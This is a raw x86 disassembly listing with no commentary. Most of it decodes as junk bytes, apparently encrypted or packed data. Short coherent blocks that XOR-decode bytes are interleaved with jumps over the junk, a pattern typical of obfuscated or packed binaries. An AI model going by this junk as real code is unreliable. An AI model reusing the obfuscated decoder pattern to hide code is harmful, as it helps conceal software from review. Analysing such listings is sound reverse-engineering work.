  40927a:	jmp    0x2997b58e
  40927f:	cmp    eax,0xfd055058
  409284:	(bad)  
  409285:	retf   
  409286:	mov    es,WORD PTR [esi]
  409288:	dec    edi
  409289:	lods   al,BYTE PTR ds:[esi]
  40928a:	(bad)  
  40928c:	sbb    DWORD PTR [edi+edi*4],ecx
  40928f:	or     al,0x1b
  409291:	add    esp,DWORD PTR [edi-0x5935917e]
  409297:	push   eax
  409298:	in     eax,dx
  409299:	add    BYTE PTR [edx],ch
  40929b:	cmc    
  40929c:	and    cl,BYTE PTR [eax+0x1778fbcc]
  4092a2:	int3   
  4092a3:	push   ds
  4092a4:	sub    al,0xf3
  4092a6:	popf   
  4092a7:	les    ebp,FWORD PTR [ecx-0x4aabeb50]
  4092ad:	fxtract 
  4092af:	ss or  edx,edx
  4092b2:	sbb    al,0x39
  4092b4:	push   ecx
  4092b5:	hlt    
  4092b6:	ffree  st(2)
  4092b8:	jns    0x409293
  4092ba:	dec    ebp
  4092bb:	or     DWORD PTR [ebx-0x1add5732],ecx
  4092c1:	xchg   ebx,eax
  4092c2:	sbb    al,0xc4
  4092c4:	(bad)  [edi-0x5a]
  4092c7:	dec    ebx
  4092c8:	scas   al,BYTE PTR es:[edi]
  4092c9:	shl    BYTE PTR [edi],1
  4092cb:	inc    eax
  4092cc:	xchg   esp,eax
  4092cd:	jo     0x409294
  4092cf:	lock dec esi
  4092d1:	xchg   ebp,eax
  4092d2:	in     al,dx
  4092d3:	(bad)  [eax-0x4b69e936]
  4092d9:	iret   
  4092da:	and    eax,DWORD PTR [esi-0x593a5ccc]
  4092e0:	cmp    eax,0xbff4c065
  4092e5:	fs xchg ecx,eax
  4092e7:	dec    edi
  4092e8:	rol    DWORD PTR [esi-0x5e46bda7],1
  4092ee:	adc    DWORD PTR [eax+edi*1+0x3e5ba9cd],edi
  4092f5:	retf   
  4092f6:	adc    BYTE PTR [esi+0x230ebe10],cl
  4092fc:	sub    bp,di
  4092ff:	pop    esi
  409300:	fucomip st,st(2)
  409302:	sub    BYTE PTR [edi-0x478b58d5],dl
  409308:	pop    ecx
  409309:	xor    dh,ah
  40930b:	jl     0x4092e4
  40930d:	(bad)  
  40930e:	lock outs dx,BYTE PTR ds:[esi]
  409310:	call   FWORD PTR [edi-0x21723f4c]
  409316:	inc    edi
  409317:	(bad)  
  409318:	mov    al,BYTE PTR [ebp+0x1fc08aee]
  40931e:	add    al,0x21
  409320:	(bad)  
  409321:	inc    esp
  409322:	jno    0x409324
  409324:	push   esp
  409325:	stc    
  409326:	jno    0x409382
  409328:	in     al,0xe4
  40932a:	enter  0x8d6c,0x84
  40932e:	adc    BYTE PTR [ebp+0x62],cl
  409331:	mov    eax,0x10458999
  409336:	mov    eax,DWORD PTR [ebp+0x18]
  409339:	mov    edx,DWORD PTR [ebp+0x1c]
  40933c:	xor    eax,esi
  40933e:	mov    dl,BYTE PTR [ebp+eax*1-0x66479db7]
  409345:	mov    eax,DWORD PTR [ebp+0x10]
  409348:	xor    BYTE PTR [eax],dl
  40934a:	mov    eax,DWORD PTR [ebp-0x38]
  40934d:	mov    edx,DWORD PTR [ebp-0x34]
  409350:	mov    edx,DWORD PTR ds:0x4331d4
  409356:	jmp    0x40942e
  40935b:	inc    ebp
  40935c:	or     al,0x7c
  40935e:	inc    ebx
  40935f:	jge    0x4093d4
  409361:	jg     0x409371
  409363:	arpl   cx,si
  409365:	push   esi
  409366:	or     eax,0x6e4731fc
  40936b:	push   ds
  40936c:	pop    ecx
  40936d:	add    BYTE PTR [eax],al
  40936f:	mov    ebx,0xa7000000
  409374:	mov    al,BYTE PTR [ebx+ecx*2-0x37e19e0]
  40937b:	ins    BYTE PTR es:[edi],dx
  40937c:	add    DWORD PTR [edi+0x2c892318],edi
  409382:	repnz in al,dx
  409384:	dec    esi
  409385:	inc    edi
  409386:	lods   eax,DWORD PTR ds:[esi]
  409387:	add    eax,0x5da6104c
  40938c:	pop    esp
  40938d:	xlat   BYTE PTR ds:[ebx]
  40938e:	nop
  40938f:	aaa    
  409390:	jl     0x409315
  409392:	pop    esp
  409393:	xor    dh,BYTE PTR [ecx-0x51]
  409396:	mov    edx,0xdde9f40d
  40939b:	cld    
  40939c:	and    esp,DWORD PTR [esi]
  40939e:	mov    cs,WORD PTR [esi+0x54]
  4093a1:	push   DWORD PTR [edi-0x4ec3889c]
  4093a7:	xchg   edi,eax
  4093a8:	rcr    DWORD PTR [ebp+edx*8-0x4d1e154b],0xee
  4093b0:	in     al,dx
  4093b1:	or     eax,0xa2862338
  4093b6:	pop    ss
  4093b7:	mov    cl,0xd7
  4093b9:	mov    DWORD PTR [ebp-0x3b5bfde8],ecx
  4093bf:	sbb    al,0x55
  4093c1:	lahf   
  4093c2:	add    BYTE PTR [edi+eax*4-0x177b572e],0xaa
  4093ca:	sub    al,0xe7
  4093cc:	das    
  4093cd:	outs   dx,DWORD PTR ds:[esi]
  4093ce:	sti    
  4093cf:	repnz shl BYTE PTR ds:0xc0674448,0x8
  4093d7:	add    DWORD PTR [eax-0x5dfe8913],ebx
  4093dd:	(bad)  
  4093de:	push   0xffffff80
  4093e0:	xchg   DWORD PTR [esi-0x54],esi
  4093e3:	pop    esp
  4093e4:	(bad)  
  4093e5:	loopne 0x4093b1
  4093e7:	shl    DWORD PTR [esi],1
  4093e9:	(bad)  
  4093ea:	sbb    ebp,DWORD PTR [ebp+0x6f9b096f]
  4093f0:	mov    eax,ds:0xd5fc8268
  4093f5:	pop    es
  4093f6:	ins    DWORD PTR es:[edi],dx
  4093f7:	mov    ch,0x65
  4093f9:	or     DWORD PTR [edi+0x42],0xfffffffa
  4093fd:	mov    WORD PTR fs:[edi],ds
  409400:	ror    DWORD PTR [edi+0x1fac29dc],1
  409406:	not    BYTE PTR [eax+0x7c]
  409409:	add    al,0xd6
  40940b:	cmc    
  40940c:	loop   0x4093dc
  40940e:	fdiv   st(1),st
  409410:	mov    eax,ds:0x38ab48cc
  409415:	cmp    ecx,DWORD PTR [edi+edx*4-0x3d47fc6c]
  40941c:	pop    edx
  40941d:	mov    dl,0x7f
  40941f:	mov    bh,0xd7
  409421:	xchg   esi,eax
  409422:	jecxz  0x4093d2
  409424:	mov    al,0x45
  409426:	or     al,ch
  409428:	inc    esi
  409429:	mov    dh,0x9e
  40942b:	(bad)  
  40942c:	scas   al,BYTE PTR es:[edi]
  40942d:	push   eax
  40942e:	xor    eax,esi
  409430:	lea    eax,[eax+edx*1-0x66479db3]
  409437:	mov    DWORD PTR [ebp+0x10],eax
  40943a:	mov    eax,DWORD PTR [ebp-0x38]
  40943d:	mov    edx,DWORD PTR [ebp-0x34]
  409440:	xor    eax,esi
  409442:	mov    dl,BYTE PTR [ebp+eax*1-0x66479db7]
  409449:	mov    eax,DWORD PTR [ebp+0x10]
  40944c:	xor    BYTE PTR [eax],dl
  40944e:	mov    eax,DWORD PTR [ebp-0x28]
  409451:	jmp    0x409529
  409456:	ins    BYTE PTR es:[edi],dx
  409457:	shl    BYTE PTR [esi-0xd],0xee
  40945b:	idiv   ebp
  40945d:	fisttp WORD PTR [edx-0x33]
  409460:	inc    esi
  409461:	ficomp WORD PTR [ebx-0x37]
  409464:	fsub   QWORD PTR [ecx+0x59d9]
  40946a:	mov    ebx,0xe2000000
  40946f:	pop    ecx
  409470:	test   DWORD PTR gs:[edx+edx*1-0x3b],esp
  409475:	cmc    
  409476:	imul   esi,DWORD PTR ds:0x7fcfeb88,0x1c08cfec
  409480:	xchg   edx,eax
  409481:	fcomp  DWORD PTR [ebx]
  409483:	scas   eax,DWORD PTR es:[edi]
  409484:	jg     0x409421
  409486:	mov    ecx,0x4c91c87d
  40948b:	fwait
  40948c:	mov    DWORD PTR ds:0x30ff6cd3,ecx
  409492:	xchg   esi,eax
  409493:	cmp    eax,0x90508880
  409498:	jo     0x409439
  40949a:	sub    ch,BYTE PTR [edi-0x2]
  40949d:	add    esp,DWORD PTR [ebp-0xd11e4df]
  4094a3:	inc    edi
  4094a4:	sahf   
  4094a5:	xchg   ah,bl
  4094a7:	ja     0x40944e
  4094a9:	xor    eax,0x716c525d
  4094ae:	retf   
  4094af:	inc    esi
  4094b0:	dec    esp
  4094b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094b2:	sub    dl,ch
  4094b4:	pop    edi
  4094b5:	sub    ch,bh
  4094b7:	push   ebx
  4094b8:	sub    ebx,DWORD PTR [edx+ebp*8]
  4094bb:	mov    ecx,0x4c9cf1a8
  4094c0:	out    dx,eax
  4094c1:	jnp    0x409479
  4094c3:	jecxz  0x409507
  4094c5:	add    al,0xf0
  4094c7:	or     al,0x2c
  4094c9:	push   es
  4094ca:	push   0xffffffed
  4094cc:	jle    0x40950b
  4094ce:	mov    WORD PTR ds:0x9f972304,cs
  4094d4:	pop    ds
  4094d5:	pop    edi
  4094d6:	pop    edx
  4094d7:	adc    eax,0x65b5b8eb
  4094dc:	xor    BYTE PTR [esi],ah
  4094de:	adc    ebx,DWORD PTR [edi+0x1ee5d365]
  4094e4:	push   esp
  4094e5:	jmp    0x4355:0x4e808682
  4094ec:	inc    ebx
  4094ed:	fcom   QWORD PTR [edx]
  4094ef:	mov    ebp,0x4db276f
  4094f4:	rep outs dx,DWORD PTR ds:[esi]
  4094f6:	jnp    0x409500
  4094f8:	pop    ebp
  4094f9:	jecxz  0x409540
  4094fb:	xor    ch,BYTE PTR ds:0x623e488
  409501:	jo     0x40948a
  409503:	aas    
  409504:	loopne 0x40951c
  409506:	push   0x4f
  409508:	mov    bh,BYTE PTR [esi]
  40950a:	xor    DWORD PTR [edx],edi
  40950c:	popf   
  40950d:	daa    
  40950e:	inc    edx
  40950f:	inc    ebx
  409510:	into   
  409511:	jbe    0x409522
  409513:	(bad)  
  409514:	mov    edx,0xe0d756c8
  409519:	(bad)  
  40951a:	int    0xbf
  40951c:	cmp    esi,0x40
  40951f:	pop    esi
  409520:	adc    BYTE PTR ds:0x98f4aec3,ch
  409526:	dec    edi
  409527:	jbe    0x409518
  409529:	mov    edx,DWORD PTR [ebp-0x24]
  40952c:	jmp    0x409604
  409531:	jp     0x409595
  409533:	test   BYTE PTR [ecx-0xc806202],0x3d
  40953a:	lahf   
  40953b:	sbb    al,0x70
  40953d:	sub    eax,0x9433abe5
  409542:	pop    edx
  409543:	add    BYTE PTR [eax],al
  409545:	mov    ebx,0x9a000000
  40954a:	sub    ebx,DWORD PTR ds:0x7bae60a0
  409550:	dec    edi
  409551:	dec    edi
  409552:	dec    ecx
  409553:	add    al,0x8b
  409555:	jae    0x40951c
  409557:	enter  0x6cab,0x9b
  40955b:	jle    0x409522
  40955d:	ret    0x8615
  409560:	cdq    
  409561:	fld    TBYTE PTR [edx]
  409563:	sub    DWORD PTR [edx-0x5f900241],ecx
  409569:	pop    ss
  40956a:	and    ah,dl
  40956c:	scas   al,BYTE PTR es:[edi]
  40956d:	push   ebx
  40956e:	test   al,0x5d
  409570:	inc    ebx
  409571:	push   ds
  409572:	cmp    dh,BYTE PTR [edi+0x63bfb4c1]
  409578:	mov    ch,BYTE PTR [edi+ebx*8+0x53]
  40957c:	xchg   edi,eax
  40957d:	adc    edi,DWORD PTR ds:0xb4c9ee90
  409583:	shr    DWORD PTR [edi-0x3b99e229],1
  409589:	sbb    al,0xb0
  40958b:	push   0xffffffd0
  40958d:	ins    DWORD PTR es:[edi],dx
  40958e:	mov    ds:0x25224c,al
  409593:	mov    ds:0x2f5ae945,al
  409598:	repz test al,0x37
  40959b:	(bad)  
  40959c:	pop    esp
  40959d:	pushfw 
  40959f:	xor    eax,0xbd86c1c
  4095a4:	lea    eax,[ebx+0x54]
  4095a7:	xchg   DWORD PTR [ecx-0x8],esp
  4095aa:	(bad)  {k2}
  4095af:	adc    eax,0xeaa6918
  4095b4:	call   DWORD PTR ds:0x4498ad59
  4095ba:	jns    0x4095c3
  4095bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095bd:	stc    
  4095be:	out    0xab,eax
  4095c0:	fdivp  st(7),st
  4095c2:	and    eax,0x302377a6
  4095c7:	pop    ecx
  4095c8:	addr16 repnz dec edi
  4095cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095cd:	inc    ebx
  4095ce:	fmulp  st(0),st
  4095d0:	and    dh,ah
  4095d2:	push   eax
  4095d3:	mov    BYTE PTR [edx],dh
  4095d5:	repnz add al,0xdc
  4095d8:	pop    ds
  4095d9:	repz cmp al,0xe4
  4095dc:	or     ecx,DWORD PTR [esi+0x21453519]
  4095e2:	jge    0x409581
  4095e4:	cmp    DWORD PTR ds:0x223d5643,0xffffff91
  4095eb:	xchg   esp,eax
  4095ec:	clc    
  4095ed:	jno    0x4095d7
  4095ef:	inc    esi
  4095f0:	or     al,0x7d
  4095f2:	lds    ecx,FWORD PTR [ecx+0x43]
  4095f5:	xchg   BYTE PTR [eax+0x5e3ccffa],bh
  4095fb:	test   bh,bl
  4095fd:	sbb    DWORD PTR [edi+eax*4-0x51297cde],0xffffff8b
  409605:	adc    eax,0x4331d4
  40960a:	xor    eax,esi
  40960c:	lea    eax,[eax+edx*1-0x66479db3]
  409613:	jmp    0x4096eb
  409618:	and    eax,0xe7adc602
  40961d:	in     eax,dx
  40961e:	outs   dx,DWORD PTR ds:[esi]
  40961f:	mov    bl,BYTE PTR [esi-0x45c05d1b]
  409625:	repnz or DWORD PTR [ebp+0x4f],ebp
  409629:	pop    ebx
  40962a:	add    BYTE PTR [eax],al
  40962c:	mov    ebx,0xde000000
  409631:	mov    edx,0xc59801ed
  409636:	push   ebx
  409637:	jnp    0x40969b
  409639:	jmp    FWORD PTR [ecx-0x30]
  40963c:	xchg   ebp,eax
  40963d:	imul   edx,DWORD PTR [esi],0xffffffac
  409640:	sbb    al,0xd8
  409642:	sbb    dl,BYTE PTR [ebx+0xb]
  409645:	sbb    BYTE PTR [ebx],dl
  409647:	mov    DWORD PTR [esp+ebp*2],eax
  40964a:	daa    
  40964b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40964c:	dec    ecx
  40964d:	inc    ebx
  40964e:	cmp    DWORD PTR [edx],esi
  409650:	shr    DWORD PTR [ebx],0xbc
  409653:	or     DWORD PTR [esi+0x6d],esi
  409656:	fmul   QWORD PTR [esi+0x6d]
  409659:	shl    DWORD PTR [esi+edx*4-0x624efa98],cl
  409660:	imul   edx,ebx,0xfffffff9
  409663:	pusha  
  409664:	daa    
  409665:	inc    esp
  409666:	shl    DWORD PTR [edx],1
  409668:	inc    esi
  409669:	pop    ecx
  40966a:	retf   0x93bc
  40966d:	inc    edi
  40966e:	or     esi,DWORD PTR [ebx+0x2e9ed5fb]
  409674:	ins    BYTE PTR es:[edi],dx
  409675:	jb     0x409606
  409677:	pushf  
  409678:	adc    edx,DWORD PTR [edi-0x7ad0951b]
  40967e:	pop    esi
  40967f:	aaa    
  409680:	adc    al,0x6f
  409682:	push   ecx
  409683:	fs shr ah,0x1c
  409687:	(bad)  
  409688:	jb     0x4096a9
  40968a:	mov    ah,BYTE PTR [ecx+0x36]
  40968d:	mov    cl,BYTE PTR [edi-0x1416f9a9]
  409693:	mov    DWORD PTR [ebx-0x7],ebp
  409696:	call   0x201506d9
  40969b:	rcl    ebp,1
  40969d:	lock jb 0x409658
  4096a0:	cmp    eax,0x649bd19b
  4096a5:	out    0xda,eax
  4096a7:	fs stos DWORD PTR es:[edi],eax
  4096a9:	dec    ebp
  4096aa:	sbb    DWORD PTR [ebx],eax
  4096ac:	push   edx
  4096ad:	scas   eax,DWORD PTR es:[edi]
  4096ae:	imul   eax,DWORD PTR [esi],0xffffffe5
  4096b1:	call   0xb47986df
  4096b6:	int    0xbd
  4096b8:	mov    ds:0x40d4adb2,eax
  4096bd:	xchg   esi,eax
  4096be:	ins    DWORD PTR es:[edi],dx
  4096bf:	add    edx,eax
  4096c1:	sbb    eax,0x9e5c3c78
  4096c6:	push   ebp
  4096c7:	add    DWORD PTR [edi],edi
  4096c9:	xchg   esi,eax
  4096ca:	mov    esp,0xb81c0110
  4096cf:	es dec eax
  4096d1:	lods   al,BYTE PTR ds:[esi]
  4096d2:	sar    BYTE PTR [ebp+eiz*4+0x23],cl
  4096d6:	mov    BYTE PTR [eax+0x27698f4d],al
  4096dc:	stos   BYTE PTR es:[edi],al
  4096dd:	mov    ebp,0xb7416f31
  4096e2:	lds    esi,FWORD PTR [edx+0x41]
  4096e5:	push   edx
  4096e6:	cmc    
  4096e7:	aam    0xfe
  4096e9:	dec    ecx
  4096ea:	jg     0x409675
  4096ec:	inc    ebp
  4096ed:	adc    BYTE PTR [ebx-0x2c1627bb],cl
  4096f3:	add    BYTE PTR [eax],al
  4096f5:	add    BYTE PTR [ebp-0x64],al
  4096f8:	mov    dl,0x33
  4096fa:	sti    
  4096fb:	aas    
  4096fc:	(bad)  
  4096ff:	mov    dl,0xa2
  409701:	aas    
  409702:	ja     0x40975f
  409704:	ret    
  409705:	add    cl,BYTE PTR [edx]
  409707:	pop    esp
  409708:	add    BYTE PTR [eax],al
  40970a:	mov    ebx,0xb4000000
  40970f:	clc    
  409710:	jb     0x409732
  409712:	idiv   DWORD PTR [edx-0x1e03a3a8]
  409718:	xchg   edx,eax
  409719:	xchg   DWORD PTR [ebx+0x6b],esp
  40971c:	and    DWORD PTR [ecx-0x959b9da],esp
  409722:	xchg   eax,esi
  409724:	test   al,0xf
  409726:	dec    edx
  409727:	inc    ebp
  409728:	mov    ebx,0x751f946b
  40972d:	push   ebp
  40972e:	sti    
  40972f:	(bad)  [ebp+0x2b3c55ce]
  409735:	cmp    al,dl
  409737:	je     0x40974f
  409739:	or     al,0xf
  40973b:	and    edx,eax
  40973d:	or     al,0xa2
  40973f:	shr    BYTE PTR [ebx+edi*4-0x51ee8c52],0x23
  409747:	imul   edx,eax,0x7e
  40974a:	xchg   esp,eax
  40974b:	push   esp
  40974c:	loope  0x409741
  40974e:	xor    BYTE PTR [ebx],dh
  409750:	(bad)  
  409751:	aas    
  409752:	or     BYTE PTR [esi],bh
  409754:	jno    0x409765
  409756:	mov    ch,0xf4
  409758:	scas   al,BYTE PTR es:[edi]
  409759:	cs mov ecx,ecx
  40975c:	and    eax,0xe5249ae7
  409761:	pop    ds
  409762:	jmp    0x8a6:0x1d2d29f6
  409769:	and    eax,0x549a8e6d
  40976e:	ret    
  40976f:	hlt    
  409770:	jg     0x40971d
  409772:	mov    eax,ds:0xdaec9f38
  409777:	cs nop
  409779:	pop    eax
  40977a:	inc    edi
  40977b:	jo     0x40971a
  40977d:	daa    
  40977e:	mov    ebp,0x56c458f
  409783:	push   edx
  409784:	dec    eax
  409785:	retf   0xb8f8
  409788:	in     eax,dx
  409789:	rcr    DWORD PTR [ebp+0x2ab92ebf],cl
  40978f:	es adc eax,0x81154402
  409795:	(bad)  
  409796:	sub    BYTE PTR [esp+ebx*8],bh
  409799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40979a:	xor    eax,DWORD PTR [ebx-0x79]
  40979d:	pop    eax
  40979e:	or     BYTE PTR [eax+0x43],cl
  4097a1:	das    
  4097a2:	repnz pop edx
  4097a4:	das    
  4097a5:	cwde   
  4097a6:	sub    ebp,DWORD PTR [eax+ecx*4-0x6b]
  4097aa:	data16 js 0x4097d1
  4097ad:	jmp    0x40977a
  4097af:	sbb    DWORD PTR [ebp-0x2afeea9e],ebx
  4097b5:	sbb    edi,DWORD PTR [eax]
  4097b7:	cs mov esp,0x8d652635
  4097bd:	loopne 0x4097fc
  4097bf:	dec    ebp
  4097c0:	loope  0x4097f7
  4097c2:	mov    si,0xb6e1
  4097c6:	or     eax,DWORD PTR [edx]
  4097c8:	lea    ecx,[ebx-0x39cc23ab]
  4097ce:	jmp    0x4098a6
  4097d3:	mov    dl,0xe7
  4097d5:	jno    0x4097cb
  4097d7:	jne    0x4097cf
  4097d9:	mov    bh,0xe7
  4097db:	dec    edx
  4097dc:	fst    QWORD PTR [edi+eiz*2+0x70be97a8]
  4097e3:	lds    ebx,FWORD PTR [eax+eax*1+0x0]
  4097e7:	mov    ebx,0x12000000
  4097ec:	xchg   ebx,eax
  4097ed:	data16 in al,0x25
  4097f0:	repnz mov bh,0xf7
  4097f3:	xor    ebp,DWORD PTR [eax*8+0x1337a351]
  4097fa:	jl     0x409862
  4097fc:	push   eax
  4097fd:	ins    DWORD PTR es:[edi],dx
  4097fe:	cmp    ebx,ebp
  409800:	fbld   TBYTE PTR [eax]
  409802:	mov    al,ds:0xd5a52873
  409807:	cmp    DWORD PTR [edx-0x577667b7],edi
  40980d:	xor    bl,BYTE PTR [edx-0x15]
  409810:	lahf   
  409811:	pop    ss
  409812:	sbb    ah,BYTE PTR [ecx]
  409814:	ins    BYTE PTR es:[edi],dx
  409815:	stc    
  409816:	inc    edi
  409817:	cmp    DWORD PTR [esi],0x63
  40981a:	js     0x4097d5
  40981c:	pop    eax
  40981d:	in     eax,0xae
  40981f:	mov    ebx,0x4f92e28f
  409824:	out    0xd5,eax
  409826:	ss aad 0x75
  409829:	fbstp  TBYTE PTR [ebx+0x52b4c549]
  40982f:	mov    BYTE PTR [eax+edx*2],cl
  409832:	push   eax
  409833:	mov    edi,DWORD PTR [ebx-0x4f]
  409836:	test   BYTE PTR [edx-0x49566614],dl
  40983c:	fadd   DWORD PTR [ebx+0x3b]
  40983f:	pop    edx
  409840:	out    dx,eax
  409841:	aad    0x40
  409843:	ds mov eax,0x920265c9
  409849:	fimul  WORD PTR [eax+0x68]
  40984c:	and    BYTE PTR [ecx+0x3d],dl
  40984f:	adc    al,0xbf
  409851:	dec    ebp
  409852:	repnz xchg esi,eax
  409854:	mov    ecx,0xa3ec153a
  409859:	dec    esp
  40985a:	mov    bl,0xe5
  40985c:	fbstp  TBYTE PTR [ebp+0x17]
  40985f:	shl    BYTE PTR ss:[edi+eiz*1+0x52],0x2d
  409865:	shr    BYTE PTR [edi],0x92
  409868:	(bad)  
  409869:	daa    
  40986a:	add    BYTE PTR [esi+0x6e61dcf6],ah
  409870:	push   ss
  409871:	test   eax,0x6e47065c
  409876:	jmp    0xa195ea08
  40987b:	outs   dx,DWORD PTR ds:[esi]
  40987c:	sub    BYTE PTR [ebp-0x135ed6d8],bl
  409882:	jno    0x40984b
  409884:	inc    esi
  409885:	rcl    ebx,cl
  409887:	xor    ebp,ebp
  409889:	lods   eax,DWORD PTR ds:[esi]
  40988a:	(bad)  
  40988b:	aam    0xc0
  40988d:	rcr    BYTE PTR [ecx+0x4e3d7705],cl
  409893:	pop    edi
  409894:	inc    esp
  409895:	dec    esp
  409896:	xchg   esp,eax
  409897:	add    esi,ebx
  409899:	xor    DWORD PTR [edx-0x1e4ff6cd],0x18
  4098a0:	mov    edx,0xfcadda63
  4098a5:	mov    BYTE PTR [edx+0x62490594],cl
  4098ab:	mov    eax,0xd3e999
  4098b0:	add    BYTE PTR [eax],al
  4098b2:	sti    
  4098b3:	stc    
  4098b4:	pop    edx
  4098b5:	ins    BYTE PTR es:[edi],dx
  4098b6:	pop    edx
  4098b7:	out    dx,eax
  4098b8:	(bad)  
  4098b9:	jmp    DWORD PTR [ebp+0x43]
  4098bc:	pop    esp
  4098bd:	ret    
  4098be:	(bad)  
  4098c0:	je     0x409854
  4098c2:	sbb    BYTE PTR [ebp+0x0],0x0
  4098c6:	mov    ebx,0x34000000
  4098cb:	repz and al,0x81
  4098ce:	repnz mov WORD PTR [ebx],?
  4098d1:	xchg   esi,eax
  4098d2:	xchg   edi,eax
  4098d3:	stos   BYTE PTR es:[edi],al
  4098d4:	test   DWORD PTR [edx+0x5b],ecx
  4098d7:	repz mov bl,ch
  4098da:	or     al,0x1d
  4098dc:	stos   DWORD PTR es:[edi],eax
  4098dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098de:	cmp    ch,bh
  4098e0:	ins    DWORD PTR es:[edi],dx
  4098e1:	cmp    al,0xb1
  4098e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098e4:	cmp    eax,0x2d30ba9b
  4098e9:	repz pop edi
  4098eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098ec:	cmp    al,0xa4
  4098ee:	inc    esp
  4098ef:	imul   esp,DWORD PTR [edi-0x16],0x89de1532
  4098f6:	je     0x409902
  4098f8:	in     al,dx
  4098f9:	jb     0x4098c5
  4098fb:	xchg   ebp,eax
  4098fc:	push   ebx
  4098fd:	pop    eax
  4098fe:	xchg   ebx,eax
  4098ff:	xchg   dl,bh
  409901:	setge  BYTE PTR [esi+eax*1+0x5c]
  409906:	fmul   st(4),st
  409908:	pop    eax
  409909:	add    esp,DWORD PTR [ebp+0x4894da6]
  40990f:	fcomp  QWORD PTR [esi+esi*2+0x7e]
  409913:	in     al,0x18
  409915:	xchg   ebp,eax
  409916:	aam    0xf2
  409918:	(bad)  
  409919:	cld    
  40991a:	sbb    DWORD PTR [esi+0x6e],0xffffffb2
  40991e:	push   ds
  40991f:	push   0x7511bea2
  409924:	ficom  WORD PTR [edx-0x9]
  409927:	push   ss
  409928:	stos   DWORD PTR es:[edi],eax
  409929:	jp     0x409994
  40992b:	int3   
  40992c:	add    esp,DWORD PTR [edi-0x4fa236d0]
  409932:	adc    dh,BYTE PTR [edx+eax*2-0x319b11ab]
  409939:	(bad)  
  40993a:	cld    
  40993b:	mov    cl,0x98
  40993d:	add    DWORD PTR [esi-0x3],eax
  409940:	mov    edi,0x9d28c323
  409945:	fsubr  st,st(4)
  409947:	and    BYTE PTR [esp+edx*8],ah
  40994a:	and    DWORD PTR [eax-0x3c],ebx
  40994d:	xlat   BYTE PTR ds:[ebx]
  40994e:	pop    ebp
  40994f:	scas   eax,DWORD PTR es:[edi]
  409950:	jmp    0x908fa0c2
  409955:	mov    DWORD PTR ds:0x8b93db5b,edi
  40995b:	fbld   TBYTE PTR [edi]
  40995d:	inc    ecx
  40995e:	adc    bh,al
  409960:	add    BYTE PTR [ebx-0x7e],al
  409963:	mov    dh,0x49
  409965:	xor    ax,0x3184
  409969:	(bad)  
  40996b:	jge    0x40999c
  40996d:	stc    
  40996e:	pop    ds
  40996f:	and    cl,al
  409971:	test   al,0x33
  409973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409974:	lahf   
  409975:	mov    al,0x77
  409977:	mov    ebx,0x1ae49008
  40997c:	dec    edi
  40997d:	bsr    esp,edx
  409980:	fstp   DWORD PTR [esi+edi*2+0x458bba6a]
  409987:	adc    BYTE PTR [eax],dh
  409989:	adc    BYTE PTR [ebx+0xd3e907],cl
  40998f:	add    BYTE PTR [eax],al
  409991:	jg     0x4099ca
  409993:	dec    edi
  409994:	mov    eax,ds:0xfffff94f
  409999:	enter  0xa4c4,0x65
  40999d:	shr    esp,1
  40999f:	fcmovnb st,st(3)
  4099a1:	cmp    ebx,DWORD PTR [esi+0x0]
  4099a4:	add    BYTE PTR [ebx+0x1000000],bh
  4099aa:	adc    al,0x5d
  4099ac:	and    bh,BYTE PTR [edx+0x5c5fbe71]
  4099b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099b3:	jge    0x409936
  4099b5:	or     ebp,DWORD PTR [ecx]
  4099b7:	out    dx,eax
  4099b8:	push   ds
  4099b9:	call   0x91e:0x21195844
  4099c0:	pop    es
  4099c1:	dec    esi
  4099c2:	mov    esi,0x9c6e3450
  4099c7:	call   0xfaca85ae
  4099cc:	dec    edi
  4099cd:	fiadd  WORD PTR [ecx]
  4099cf:	jb     0x409989
  4099d1:	push   esp
  4099d2:	and    BYTE PTR [edx-0x4b],dl
  4099d5:	outs   dx,BYTE PTR ds:[esi]
  4099d6:	sub    ebx,0x0
  4099d9:	fs ins BYTE PTR es:[edi],dx
  4099db:	js     0x409996
  4099dd:	not    DWORD PTR [edx-0x11]
  4099e0:	adc    edx,DWORD PTR [ebx+ecx*4-0x4]
  4099e4:	jae    0x409a56
  4099e6:	sbb    al,0xf5
  4099e8:	mov    ah,0xc8
  4099ea:	mov    ds:0xd589dbd1,eax
  4099ef:	cld    
  4099f0:	test   eax,0x1f067810
  4099f5:	mov    ah,0xa
  4099f7:	cwde   
  4099f8:	ins    BYTE PTR es:[edi],dx
  4099f9:	popa   
  4099fa:	push   0x2efa7cb6
  4099ff:	mov    edi,0x6b34b234
  409a04:	xchg   DWORD PTR [ecx],ebp
  409a06:	pop    esi
  409a07:	jge    0x4099df
  409a09:	push   ss
  409a0a:	mov    al,0xdf
  409a0c:	and    ch,0xcd
  409a0f:	retf   
  409a10:	or     al,0xe4
  409a12:	pop    esi
  409a13:	dec    ebp
  409a14:	push   cs
  409a15:	sti    
  409a16:	repz fcmovnb st,st(0)
  409a19:	lea    esp,[esp+edx*2-0x78]
  409a1d:	daa    
  409a1e:	loop   0x409a62
  409a20:	pop    edi
  409a21:	shr    DWORD PTR [eax+0x5b082c92],0xc5
  409a28:	scas   eax,DWORD PTR es:[edi]
  409a29:	dec    ecx
  409a2a:	out    0x38,al
  409a2c:	dec    ecx
  409a2d:	push   esi
  409a2e:	mov    ?,WORD PTR ds:0xfe8bbe4
  409a34:	add    dl,dh
  409a36:	cwde   
  409a37:	mov    bh,0x8b
  409a39:	retf   0xc68a
  409a3c:	aas    
  409a3d:	dec    ebp
  409a3e:	rcl    bh,0xf4
  409a41:	cmp    edi,DWORD PTR [ebp-0x7f41b4f7]
  409a47:	or     eax,0x25c50266
  409a4c:	pop    ebp
  409a4d:	in     al,0x36
  409a4f:	inc    eax
  409a50:	enter  0x45fe,0xd8
  409a54:	ficomp DWORD PTR [esi+0x5cdba3c2]
  409a5a:	(bad)  [ecx]
  409a5c:	aam    0x91
